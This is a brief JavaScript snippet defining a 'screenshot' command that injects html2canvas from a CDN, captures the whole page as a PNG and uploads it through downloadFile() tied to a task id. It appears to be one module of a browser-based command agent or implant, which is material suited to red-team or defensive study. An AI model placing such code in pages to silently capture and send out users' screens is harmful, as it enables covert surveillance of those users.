COMMANDS['screenshot'] = async function(task) {
    var b64data = await new Promise(function(resolve, reject) {
        if (typeof html2canvas !== 'undefined') {
            capture();
            return;
        }

        var s = document.createElement('script');
        s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
        s.onload = capture;
        s.onerror = function() { reject(new Error('failed to load html2canvas')); };
        (document.head || document.documentElement).appendChild(s);

        function capture() {
            html2canvas(document.body).then(function(canvas) {
                var dataUrl = canvas.toDataURL('image/png');
                resolve(dataUrl.split(';base64,')[1]);
            }).catch(reject);
        }
    });

    var fileId = await downloadFile(task.id, 'screenshot.png', b64data, true);
    return JSON.stringify({file_id: fileId});
};
